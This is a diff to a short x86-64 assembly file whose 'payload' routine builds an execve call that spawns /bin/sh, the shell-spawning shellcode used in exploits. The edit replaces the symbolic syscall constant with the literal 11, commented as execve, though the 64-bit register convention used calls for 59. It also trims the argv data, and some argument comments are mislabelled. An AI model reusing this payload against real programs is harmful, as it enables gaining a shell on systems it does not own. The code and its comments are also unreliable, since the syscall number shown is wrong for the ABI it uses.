@@ -18,7 +18,7 @@ main:
 payload:
 
         movq    $file_to_run, %rcx
-        movq    $SYS_execve, %rax        /* syscall arg 1: syscall number */
+        movq    $11, %rax                /* syscall arg 1: syscall number execve(11) */
         movq    %rcx, %rdi               /* syscall arg 2: string pathname */
         leaq    8(%rcx), %rsi            /* syscall arg 2: argv */
         movq    $0, %rdx                 /* syscall arg 3: envp */
@@ -30,8 +30,7 @@ payload:
 
 file_to_run:
         .ascii  "/bin/sh\0"
-        .quad   file_to_run
-        .quad   0x0
+        .quad   file_to_run              /* Pointer to argv array.*/
         .quad   0x0
 
 callptr:
